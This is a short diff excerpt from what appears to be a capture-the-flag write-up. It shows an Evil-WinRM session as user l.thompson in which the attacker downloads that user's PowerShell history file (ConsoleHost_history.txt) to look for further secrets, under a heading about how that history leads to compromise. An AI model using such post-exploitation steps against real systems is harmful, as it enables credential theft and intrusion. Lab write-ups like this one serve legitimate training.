@@ -810,7 +810,7 @@ novacart\l.thompson
 ```
 Now im logged in as this user!
 
-# Powershell history
+# Powershell history leads to use compromise
 
 ```python
 *Evil-WinRM* PS C:\Users\l.thompson\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> download ConsoleHost_history.txt
